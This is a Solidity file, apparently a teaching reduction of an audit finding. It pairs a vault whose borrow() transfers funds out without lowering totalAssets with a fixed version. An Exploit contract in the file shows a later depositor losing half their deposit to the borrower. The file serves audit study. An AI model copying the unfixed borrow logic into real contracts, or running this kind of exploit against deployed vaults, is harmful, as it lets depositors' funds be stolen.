// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Omo — borrow() should decrease totalAssets (Pashov Audit Group, C-06)
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: borrow transfers assets to the agent and leaves totalAssets
    unchanged, so the next depositor buys shares at an inflated price and
    is paid 50 of the 100 they deposited. The quoted borrow body is preserved.
    The fix subtracts assets from totalAssets before the transfer. */

contract MiniToken {
    string public symbol;
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory s) {
        symbol = s;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract OmoVault {
    MiniToken public asset;
    address public agent;
    uint256 public totalAssets;
    uint256 public supply;
    mapping(address => uint256) public sharesOf;

    constructor(address token, address agent_) {
        asset = MiniToken(token);
        agent = agent_;
    }

    function deposit(uint256 assets) external returns (uint256 shares) {
        if (supply == 0) shares = assets;
        else shares = assets * supply / totalAssets;
        sharesOf[msg.sender] += shares;
        supply += shares;
        totalAssets += assets;
        asset.transferFrom(msg.sender, address(this), assets);
    }

    function borrow(uint256 assets, address receiver) external {
        address msgSender = msg.sender;
        require(msgSender == agent, "only agent");
        require(assets != 0, "ZERO_ASSETS");
        // @> VULN: assets leave the vault and totalAssets is not reduced
        asset.transfer(receiver, assets);
    }

    function withdraw(uint256 shares) external returns (uint256 assetsOut) {
        require(sharesOf[msg.sender] >= shares, "shares");
        assetsOut = shares * totalAssets / supply;
        sharesOf[msg.sender] -= shares;
        supply -= shares;
        uint256 cash = asset.balanceOf(address(this));
        if (assetsOut > cash) assetsOut = cash;
        totalAssets -= assetsOut;
        asset.transfer(msg.sender, assetsOut);
    }
}

contract OmoVaultFixed {
    MiniToken public asset;
    address public agent;
    uint256 public totalAssets;
    uint256 public supply;
    mapping(address => uint256) public sharesOf;

    constructor(address token, address agent_) {
        asset = MiniToken(token);
        agent = agent_;
    }

    function deposit(uint256 assets) external returns (uint256 shares) {
        if (supply == 0) shares = assets;
        else shares = assets * supply / totalAssets;
        sharesOf[msg.sender] += shares;
        supply += shares;
        totalAssets += assets;
        asset.transferFrom(msg.sender, address(this), assets);
    }

    function borrow(uint256 assets, address receiver) external {
        address msgSender = msg.sender;
        require(msgSender == agent, "only agent");
        require(assets != 0, "ZERO_ASSETS");
        // FIX: borrowed assets are no longer counted in the share price
        totalAssets -= assets;
        asset.transfer(receiver, assets);
    }

    function withdraw(uint256 shares) external returns (uint256 assetsOut) {
        require(sharesOf[msg.sender] >= shares, "shares");
        assetsOut = shares * totalAssets / supply;
        sharesOf[msg.sender] -= shares;
        supply -= shares;
        totalAssets -= assetsOut;
        asset.transfer(msg.sender, assetsOut);
    }
}

interface IVault {
    function deposit(uint256 assets) external returns (uint256 shares);
    function withdraw(uint256 shares) external returns (uint256 assetsOut);
    function sharesOf(address account) external view returns (uint256);
}

contract Bob {
    MiniToken public asset;

    constructor(address token) {
        asset = MiniToken(token);
    }

    function deposit(IVault vault, uint256 amount) external {
        asset.approve(address(vault), amount);
        vault.deposit(amount);
    }

    function withdrawAll(IVault vault) external returns (uint256) {
        return vault.withdraw(vault.sharesOf(address(this)));
    }
}

contract Sink {}

contract Exploit {
    uint256 public constant ALICE = 100 ether;
    uint256 public constant TAKEN = 50 ether;
    uint256 public constant BOB_IN = 100 ether;

    MiniToken public asset; // CREATE nonce 1
    Sink public sink; // CREATE nonce 2
    OmoVault public vault; // CREATE nonce 3
    Bob public bob; // CREATE nonce 4

    uint256 public inflatedBy;
    uint256 public aliceGot;
    uint256 public bobGot;
    uint256 public bobLoss;

    constructor() {
        asset = new MiniToken("OUSD");
        sink = new Sink();
        vault = new OmoVault(address(asset), address(this));
        bob = new Bob(address(asset));
    }

    function run() external {
        asset.mint(address(this), ALICE);
        asset.approve(address(vault), ALICE);
        vault.deposit(ALICE);

        vault.borrow(TAKEN, address(sink));
        uint256 cash = asset.balanceOf(address(vault));
        inflatedBy = vault.totalAssets() - cash;

        asset.mint(address(bob), BOB_IN);
        bob.deposit(IVault(address(vault)), BOB_IN);

        aliceGot = vault.withdraw(vault.sharesOf(address(this)));
        bobGot = bob.withdrawAll(IVault(address(vault)));
        bobLoss = BOB_IN - bobGot;

        require(inflatedBy == TAKEN, "totalAssets not inflated by the borrow");
        require(aliceGot == ALICE, "attacker withdraw");
        require(bobGot == TAKEN, "later depositor received");
        require(bobLoss == TAKEN, "later depositor loss");
        asset.transfer(msg.sender, bobLoss);
    }
}
